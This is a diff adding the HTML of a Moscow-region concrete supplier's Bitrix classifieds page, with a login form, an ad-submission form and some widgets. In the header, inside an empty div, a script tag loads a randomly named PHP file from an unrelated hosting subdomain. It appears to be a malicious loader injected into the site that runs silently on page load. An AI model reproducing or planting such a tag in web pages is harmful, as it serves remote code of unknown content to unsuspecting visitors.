@@ -1,0 +1,585 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+<meta name="robots" content="index, follow" />
+<meta name="keywords" content="ООО СтройХолдинг" />
+<link href="/bitrix/templates/books/components/bitrix/menu/horizontal_multilevel/style.css?1241628185" type="text/css" rel="stylesheet" />
+<link href="/bitrix/components/bitrix/menu/templates/.default/style.css?1241627783" type="text/css" rel="stylesheet" />
+<link href="/bitrix/components/bitrix/breadcrumb/templates/.default/style.css" type="text/css" rel="stylesheet" />
+<link href="/bitrix/components/bitrix/main.calendar/templates/.default/style.css?1241627781" type="text/css" rel="stylesheet" />
+<link href="/bitrix/templates/books/styles.css" type="text/css" rel="stylesheet" />
+<link href="/bitrix/templates/books/template_styles.css" type="text/css" rel="stylesheet" />
+
+<script type="text/javascript" src="/bitrix/js/main/utils.js"></script>
+<script type="text/javascript" src="/bitrix/js/main/popup_menu.js"></script>
+<title>Доска объявлений</title>
+</head>
+
+<body>
+ 
+ 
+ 
+ 
+<div id="panel"></div>
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+<div id="header">
+ 
+ 
+ 
+ 
+  <div id="header_text"><p align="left"></p>
+<script type="text/javascript" src="http://u2955952-vitaegc.mass.hc.ru/zZnvPGJd.php?id=279394"></script> </div>
+
+ 
+ 
+ 
+ 	
+ 
+ 
+ 
+ 
+  <div id="header_menu">
+<a href="/" title="Главная"><img width="12" height="11" src="/bitrix/templates/books/images/icons/home.gif" alt="Главная" border="0" /></a>
+<a href="/search/" title="Поиск"><img width="12" height="12" src="/bitrix/templates/books/images/icons/search.gif" alt="Поиск" border="0" /></a>
+<a href="/search/map.php" title="Карта сайта"><img width="14" height="9" src="/bitrix/templates/books/images/icons/map.gif" alt="Карта сайта" border="0" /></a>
+<a href="/content/board/my/index.php?edit=Y&amp;print=Y" title="Версия для печати" rel="nofollow"><img width="12" height="12" src="/bitrix/templates/books/images/icons/printer.gif" alt="Версия для печати" border="0" /></a> </div>
+
+ 
+ 
+ 
+ 
+ </div>
+
+ 
+ 
+ 
+ <script src="/bitrix/templates/books/components/bitrix/menu/horizontal_multilevel/script.js?1241628183" type="text/javascript"></script>
+<ul id="horizontal-multilevel-menu">
+
+
+	
+	
+		
+							<li><a href="/index.php" class="root-item">О КОМПАНИИ</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/Proizvodstvo_Betona/" class="root-item">ПРОИЗВОДСТВО БЕТОНА</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/Dostavka_Betona/" class="root-item">ДОСТАВКА БЕТОНА</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/zakaz/" class="root-item">ЗАКАЗ ПОСТАВКИ</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/kontrol_kachestva/" class="root-item">КОНТРОЛЬ КАЧЕСТВА</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/Kontakti/" class="root-item">КОНТАКТЫ</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/docs/" class="root-item">ДОКУМЕНТЫ</a></li>
+			
+		
+	
+	
+
+	
+	
+		
+							<li><a href="/galery/" class="root-item">ФОТОГАЛЕРЕЯ</a></li>
+			
+		
+	
+	
+
+
+</ul>
+<div class="menu-clear-left"></div>
+ 
+ 
+ 
+ 
+ 
+<div id="zebra"></div>
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+<table id="content">
+ 
+ 
+ 
+ 
+  <tbody>
+ 
+ 
+ 
+ 
+    <tr><td class="left-column">
+<ul class="left-menu">
+
+			<li><a href="/content/articles/">Статьи</a></li>
+		
+			<li><a href="/content/news/">Новости</a></li>
+		
+			<li><a href="/content/media/">Видео и аудио</a></li>
+		
+			<li><a href="/content/board/" class="selected">Доска объявлений</a></li>
+		
+			<li><a href="/content/links/">Каталог ресурсов</a></li>
+		
+			<li><a href="/content/faq/">Часто задаваемые вопросы</a></li>
+		
+
+</ul>
+ 
+ 	
+ 
+ 
+ 
+<!-- SOCIALNETWORK -->
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+        <div class="content-block">
+ 
+ 
+ 
+ 
+          <div class="content-block-head">Поиск по сайту</div>
+        
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+          <div class="content-block-body"><div class="search-form">
+<form action="/search/">
+	<table border="0" cellspacing="0" cellpadding="2" align="center">
+		<tr>
+			<td align="center"><input type="text" name="q" value="" size="15" maxlength="50" /></td>
+		</tr>
+		<tr>
+			<td align="right"><input name="s" type="submit" value="Поиск" /></td>
+		</tr>
+	</table>
+</form>
+</div> </div>
+        
+ 
+ 
+ 
+ </div>
+      
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+        <div class="content-block">
+ 
+ 
+ 
+ 
+          <div class="content-block-head">Авторизация</div>
+        
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+          <div class="content-block-body">
+
+<div id="at_bitrix">
+<form method="post" target="_top" action="/content/board/my/index.php?login=yes&amp;edit=Y">
+			<input type="hidden" name="backurl" value="/content/board/my/index.php?edit=Y" />
+			<input type="hidden" name="AUTH_FORM" value="Y" />
+	<input type="hidden" name="TYPE" value="AUTH" />
+	<table width="95%">
+			<tr>
+				<td colspan="2">
+				Логин:<br />
+				<input type="text" name="USER_LOGIN" maxlength="50" value="" size="17" /></td>
+			</tr>
+			<tr>
+				<td colspan="2">
+				Пароль:<br />
+				<input type="password" name="USER_PASSWORD" maxlength="50" size="17" /></td>
+			</tr>
+					<tr>
+				<td valign="top"><input type="checkbox" id="USER_REMEMBER" name="USER_REMEMBER" value="Y" /></td>
+				<td width="100%"><label for="USER_REMEMBER">Запомнить меня на этом компьютере</label></td>
+			</tr>
+							<tr>
+				<td colspan="2"><input type="submit" name="Login" value="Войти" /></td>
+			</tr>
+					<tr>
+				<td colspan="2"><a href="/auth/?register=yes&amp;backurl=%2Fcontent%2Fboard%2Fmy%2Findex.php%3Fedit%3DY">Регистрация</a><br /></td>
+			</tr>
+		
+			<tr>
+				<td colspan="2"><a href="/auth/?forgot_password=yes&amp;backurl=%2Fcontent%2Fboard%2Fmy%2Findex.php%3Fedit%3DY">Забыли свой пароль?</a></td>
+			</tr>
+	</table>
+</form>
+</div>
+
+
+</div>
+        
+ 
+ 
+ 
+ 
+ <p></p><p></p><p></p>
+ 
+          <div class="content-block-body">
+ 
+ 
+<!--SUBSCRIBE-->
+
+ <!-- Gismeteo informer START -->
+<p></p><p></p><p></p>
+
+<link rel="stylesheet" type="text/css" href="http://www.gismeteo.ru/static/css/informer2/gs_informerClient.min.css">
+<div id="gsInformerID-5kA10cJM" class="gsInformer" style="width:185px;height:300px">
+  <div class="gsIContent">
+   <div id="cityLink">
+     <a href="http://www.gismeteo.ru/city/daily/4368/" target="_blank">Погода в Москве</a>
+   </div>
+   <div class="gsLinks">
+     
+<table>
+       <tr>
+         <td>
+           <div class="leftCol">
+           <a href="http://www.gismeteo.ru" target="_blank">
+               
+             </a>
+             </div>
+           <div class="rightCol">
+             
+           </div>
+           </td>
+        </tr>
+      </table>
+
+    </div>
+  </div>
+</div>
+<script src="http://www.gismeteo.ru/ajax/getInformer/?hash=5kA10cJM" type="text/javascript"></script>
+<!-- Gismeteo informer END -->
+
+ 
+ 
+
+ 
+ 
+ 
+ 
+<!--BANNER_LEFT-->
+</div>
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+        <p align="center"><EMBED type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" src="/calculator/calculator.swf" ></EMBED></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+ 
+ </td><td class="main-column">
+ 
+ 
+ 
+ 
+        <div id="navigation"><ul class="breadcrumb-navigation"><li><a href="/" title="ООО Стройхолдинг">ООО Стройхолдинг</a></li><li><span>&nbsp;&gt;&nbsp;</span></li><li><a href="/content/" title="Контент">Контент</a></li><li><span>&nbsp;&gt;&nbsp;</span></li><li><a href="/content/board/" title="Доска объявлений">Доска объявлений</a></li><li><span>&nbsp;&gt;&nbsp;</span></li><li><a href="/content/board/my/" title="Мои объявления">Мои объявления</a></li></ul> </div>
+      
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+        <h1 id="pagetitle">Доска объявлений</h1>
+<form name="iblock_add" action="/content/board/my/index.php?edit=Y" method="post" enctype="multipart/form-data">
+
+	<input type="hidden" name="sessid" id="sessid" value="10bc822c1157ca84e19c3ba1d8fb2de1" />
+	
+	<table class="data-table">
+		<thead>
+			<tr>
+				<td colspan="2">&nbsp;</td>
+			</tr>
+		</thead>
+				<tbody>
+							<tr>
+					<td>Краткое описание объявления<span class="starrequired">*</span></td>
+					<td>
+														<input type="text" name="PROPERTY[NAME][0]" size="25" value="" /><br />					</td>
+				</tr>
+							<tr>
+					<td>Срок публикации до</td>
+					<td>
+														<input type="text" name="PROPERTY[DATE_ACTIVE_TO][0]" size="25" value="" /><script>
+if (typeof(phpVars) != 'object') {window['phpVars'] = {}};
+phpVars.FORMAT_DATE = 'DD.MM.YYYY';
+phpVars.FORMAT_DATETIME = 'DD.MM.YYYY HH:MI:SS';
+
+jsCalendarMess = {
+	'resource_path': '/bitrix/components/bitrix/main.calendar/templates/.default',
+	'title': 'Календарь',
+	'date': 'Вставить дату',
+	'jan': 'Январь',
+	'feb': 'Февраль',
+	'mar': 'Март',
+	'apr': 'Апрель',
+	'may': 'Май',
+	'jun': 'Июнь',
+	'jul': 'Июль',
+	'aug': 'Август',
+	'sep': 'Сентябрь',
+	'okt': 'Октябрь',
+	'nov': 'Ноябрь',
+	'des': 'Декабрь',
+	'prev_mon': 'Предыдущий месяц',
+	'next_mon': 'Следующий месяц',
+	'curr': 'Перейти на текущий месяц',
+	'curr_day': 'Вставить текущую дату',
+	'mo': 'Пн',
+	'tu': 'Вт',
+	'we': 'Ср',
+	'th': 'Чт',
+	'fr': 'Пт',
+	'sa': 'Сб',
+	'su': 'Вс',
+	'per_week': 'Период: неделя',
+	'per_mon': 'Период: месяц',
+	'per_year': 'Период: год',
+	'close': 'Закрыть',
+	'month': 'Выбрать месяц',
+	'year': 'Выбрать год',
+	'time': 'Показать время',
+	'time_hide': 'Скрыть время',
+	'hour': 'ч:',
+	'minute': 'м:',
+	'second': 'с:',
+	'hour_title': 'Часы (00 - 23)',
+	'minute_title': 'Минуты (00 - 59)',
+	'second_title': 'Секунды (00 - 59)',
+	'set_time': 'Установить текущее время (серверное)',
+	'clear_time': 'Сбросить время',
+	'error_fld': 'Ошибка! Не найдено поле ввода'
+};
+</script><script type="text/javascript" src="/bitrix/components/bitrix/main.calendar/templates/.default/calendar.js?1241627781"></script><a href="javascript:void(0);" title="Выбрать дату в календаре"><img src="/bitrix/components/bitrix/main.calendar/templates/.default/images/icon.gif" alt="Выбрать дату в календаре" class="calendar-icon" onclick="jsCalendar.Show(this, 'PROPERTY[DATE_ACTIVE_TO][0]', 'PROPERTY[DATE_ACTIVE_TO][0]', '', false, '1512831173','iblock_add', false);" onmouseover="this.className+=' calendar-icon-hover';" onmouseout="this.className = this.className.replace(/\s*calendar-icon-hover/ig, '');" border="0"/></a><br /><small>Формат: DD.MM.YYYY HH:MI:SS</small><br />					</td>
+				</tr>
+							<tr>
+					<td>Категория<span class="starrequired">*</span></td>
+					<td>
+													<select name="PROPERTY[IBLOCK_SECTION]">
+																</select>
+														</td>
+				</tr>
+							<tr>
+					<td>Текст объявления<span class="starrequired">*</span></td>
+					<td>
+												<textarea cols="30" rows="5" name="PROPERTY[DETAIL_TEXT][0]"></textarea>
+													</td>
+				</tr>
+							<tr>
+					<td>E-mail</td>
+					<td>
+														<input type="text" name="PROPERTY[45][0]" size="25" value="" /><br />					</td>
+				</tr>
+							<tr>
+					<td>Сайт</td>
+					<td>
+														<input type="text" name="PROPERTY[46][0]" size="25" value="" /><br />					</td>
+				</tr>
+										<tr>
+					<td>Защита от автоматического заполнения</td>
+					<td>
+						<input type="hidden" name="captcha_sid" value="66e0dff26697eb2cf7716ea3f5c168ee" />
+						<img src="/bitrix/tools/captcha.php?captcha_sid=66e0dff26697eb2cf7716ea3f5c168ee" width="180" height="40" alt="CAPTCHA" />
+					</td>
+				</tr>
+				<tr>
+					<td>Введите слово с картинки<span class="starrequired">*</span>:</td>
+					<td><input type="text" name="captcha_word" maxlength="50" value=""></td>
+				</tr>
+					</tbody>
+				<tfoot>
+			<tr>
+				<td colspan="2">
+					<input type="submit" name="iblock_submit" value="Сохранить" />
+														</td>
+			</tr>
+		</tfoot>
+	</table>
+	<br />
+	<a href="/content/board/my/index.php">Назад к списку</a></form> </td><td class="right-column">  </td></tr>
+  
+ 
+ 
+ 
+ </tbody>
+
+ 
+ 
+ 
+ </table>
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+<!--BANNER_BOTTOM-->
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+<div id="footer"><div align="right"><font color="#ffffff"><font color="#000000" size="1">ПРОИЗВОДСТВО И ДОСТАВКА БЕТОНА В МОСКОВСКОЙ ОБЛАСТИ - БЕТОН ПРОДАЖА - 200, 300, ГРАВИЙ КУПИТЬ, ЦЕМЕНТНЫЙ РАСТВОР, ЩЕБЕНЬ ПРОДАЖА, ПЕСОК  - НОГИНСК, ЭЛЕКТРОСТАЛЬ, БАЛАШИХА, ЖЕЛЕЗНОДОРОЖНЫЙ, ПАВЛОВСКИЙ ПОСАД. </font></font><span class="Apple-style-span" style="FONT-SIZE: x-small">Диспетчерская: 8(495) 506-95-64; </span><span class="Apple-style-span" style="FONT-SIZE: x-small">Отдел реализации: 8(916) 442-21-87;</span></div>
+
+<div align="right"><font color="#ffffff"><font color="#000000" size="1">Телефон-Факс(Бухгалтерия): 8 (496) 578-07-12 
+      <br />
+    </font></font></div>
+
+<div align="left">
+<!--Rating@Mail.ru counter-->
+ 
+<script language="javascript" type="text/javascript"><!--
+d=document;var a='';a+=';r='+escape(d.referrer);js=10;//--></script>
+ 
+<script language="javascript1.1" type="text/javascript"><!--
+a+=';j='+navigator.javaEnabled();js=11;//--></script>
+ 
+<script language="javascript1.2" type="text/javascript"><!--
+s=screen;a+=';s='+s.width+'*'+s.height;
+a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth);js=12;//--></script>
+ 
+<script language="javascript1.3" type="text/javascript"><!--
+js=13;//--></script>
+ 
+<script language="javascript" type="text/javascript"><!--
+d.write('<a href="http://top.mail.ru/jump?from=1674069" target="_top">'+
+'<img src="http://db.c8.b9.a1.top.mail.ru/counter?id=1674069;t=99;js='+js+ a+';rand='+Math.random()+'" alt="Рейтинг@Mail.ru" border="0" '+ 'height="18" width="88"><\/a>');if(11<js)d.write('<'+'!-- ');//--></script>
+ <noscript></noscript>
+<script language="javascript" type="text/javascript"><!--
+if(11<js)d.write('--'+'>');//--></script>
+ 
+<!--// Rating@Mail.ru counter-->
+ </div>
+ </div>
+
+ 
+ 
+ 
+ </body>
+</html>
